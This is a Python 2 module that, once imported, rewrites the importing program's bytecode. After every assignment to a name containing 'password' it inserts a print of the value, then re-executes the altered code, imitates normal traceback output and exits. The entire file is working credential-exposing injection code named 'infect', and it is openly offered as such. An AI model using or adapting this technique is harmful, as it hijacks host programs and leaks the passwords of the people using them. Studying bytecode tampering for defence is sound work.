imp_globals = globals().copy()
import inspect, types, opcode, dis, struct, sys, traceback

def OpcodeFactory(op_id, arg = None, byte_index = 0):
    dict = {"hasjabs": AbsJump, "hasjrel": RelJump}
    name = opcode.opname[op_id]
    for attr in dict:
        if op_id in getattr(dis, attr):
            return dict[attr](op_id, arg, byte_index)
    return Opcode(op_id, arg, byte_index)

class Opcode(object):
    def __init__(self, op_id, arg = None, byte_index = 0):
        self.opcode = op_id
        if self.opcode >= opcode.HAVE_ARGUMENT:
            assert(arg is not None)
        self.arg = arg
        self.byte_index = byte_index
        self.line = 0
        self.linked_opcode = None
        self.next_opcode = None
        self.last_opcode = None

    def __repr__(self):
        return opcode.opname[self.opcode]+"@"+str(self.arg)

    def pass_2(self): pass

    def fix(self): pass
    
class AbsJump(Opcode):
    def __init__(self, op_id, arg, byte_index):
        super(AbsJump, self).__init__(op_id, arg, byte_index)
        
    def pass_2(self):
        direction = cmp(self.byte_index,self.arg)
        assert(direction != 0)
        directions = {-1:"next_opcode", 1: "last_opcode"}
        cur_opcode = self
        while cur_opcode.byte_index != self.arg:
            cur_opcode = getattr(cur_opcode, directions[direction])
            if cur_opcode is None:
                raise AssertionError("Jump target isn't a valid opcode")
        self.linked_opcode = cur_opcode

    def fix(self):
        self.arg = self.linked_opcode.byte_index

class RelJump(AbsJump):
    def __init__(self, op_id, arg, byte_index):
        super(RelJump, self).__init__(op_id, arg+byte_index+3, byte_index)
    
    def fix(self):
        self.arg = self.linked_opcode.byte_index - self.byte_index-3

class Bytecode(object):
    def __init__(self, code_obj):
        self.labels = []
        self.opcodes = []
        self.co_code = ""
        self._code_obj = code_obj
        self.decompile()

    def decompile(self):
        co_code = self._code_obj.co_code
        i = 0
        n = len(co_code)
        while i < n:
            byte_index = i
            c = co_code[i]
            op = ord(c)
            i+=1
            arg_id = None
            if op >= opcode.HAVE_ARGUMENT:
                arg = co_code[i:i+2]
                i+=2
                arg_id = struct.unpack("<H", arg)[0]
            self.opcodes.append(OpcodeFactory(op, arg_id, byte_index))
            if len(self.opcodes) >= 2:
                self.opcodes[-1].last_opcode = self.opcodes[-2]
                self.opcodes[-2].next_opcode = self.opcodes[-1]
        for op in self.opcodes:
            op.pass_2()

    def get_code(self):
        self.fix_opcodes()
        self.co_code = ""
        for op in self.opcodes:
            #print len(self.co_code), op.byte_index
            self.co_code += chr(op.opcode)
            if op.arg is not None: self.co_code += struct.pack("<H", op.arg)
        return self.co_code
    
    def get_opcodes(self, f_id, f_args):
        return [op for op in self.opcodes if op.opcode==f_id and op.arg in f_args]

    def init_opcodes(self, opcodes, orig_index = 0):
        new_ops = []
        bytecode_delta = 0
        for new_op in opcodes:
            op_id = opcode.opmap[new_op[0]]
            op_len = 1
            try:
                op_arg = new_op[1]
            except IndexError:
                op_arg = None
            else:
                op_len = 3
            #print "OI+BD:",orig_index+bytecode_delta
            new_ops.append(OpcodeFactory(op_id, op_arg, orig_index+bytecode_delta))
            bytecode_delta += op_len
        return new_ops, bytecode_delta

    def insert_at_pos(self, opcodes, pos):
        op = self.opcodes[pos]
        new_ops, bytecode_delta = self.init_opcodes(opcodes, op.byte_index)
        #bytecode_delta += 1
        #if op.arg: bytecode_delta += 2
        try: op.last_opcode.next_opcode = new_ops[0]
        except AttributeError: pass
        op.last_opcode = new_ops[-1]
        cur_opcode = op
        while cur_opcode is not None:
            cur_opcode.byte_index += bytecode_delta
            cur_opcode = cur_opcode.next_opcode
        self.opcodes[pos:pos] = new_ops
    
    def insert_after_opcode(self, op, opcodes):
        index = [i+1 for i, val in enumerate(self.opcodes) if val == op][0]
        self.insert_at_pos(opcodes, index)

    def fix_opcodes(self):
        for op in self.opcodes: op.fix()
                
def infect_code(code, vars):
    co_code = code.co_code
    byte_increments = [ord(c) for c in code.co_lnotab[0::2]]
    line_increments = [ord(c) for c in code.co_lnotab[1::2]]
    bytecode = Bytecode(code)
    names = bytecode.get_opcodes(opcode.opmap["STORE_NAME"], vars[0])
    fasts = bytecode.get_opcodes(opcode.opmap["STORE_FAST"], vars[1])
    for name in names:
        bytecode.insert_after_opcode(name, [("LOAD_NAME", name.arg), ("PRINT_ITEM",), ("PRINT_NEWLINE",)])
    for fast in fasts:
        bytecode.insert_after_opcode(fast, [("LOAD_FAST", fast.arg), ("PRINT_ITEM",), ("PRINT_NEWLINE",)])
#    print bytecode.opcodes
#    bytecode.insert_at_pos([("PRINT_NEWLINE",)],0)
#    print bytecode.opcodes
#    print "DIS"
#    dis.dis(bytecode.get_code())
#    print "ENDDIS"
    return bytecode.get_code()

def infect(code_obj):
    code_attrs = ["argcount", "nlocals", "stacksize", "flags", "code", "consts", "names", "varnames", "filename", "name", "firstlineno", "lnotab"]
    code_list = [getattr(code_obj,"co_"+k) for k in code_attrs]
    code_list[5] = list(code_list[5])
    for i, const in enumerate(code_obj.co_consts):
        if isinstance(const, types.CodeType):
            code_list[5][i] = infect(const)
    pass_names = [i for i,n in enumerate(code_obj.co_names) if "password" in n]
    pass_varnames = [i for i,n in enumerate(code_obj.co_varnames) if "password" in n]
    if pass_names: code_list[4] = infect_code(code_obj, [pass_names, pass_varnames])
    code_list[5] = tuple(code_list[5])
    infected = types.CodeType(*code_list)
    return infected

infected = infect(inspect.currentframe().f_back.f_code)
try:
    types.FunctionType(infected, imp_globals)()
except:
    exec_info = sys.exc_info()
    sys.stderr.write("Traceback (most recent call last):\n")
    sys.stderr.write("".join(traceback.format_tb(exec_info[2].tb_next)))
    sys.stderr.write(exec_info[0].__name__+": "+exec_info[1].message+"\n")
sys.exit()
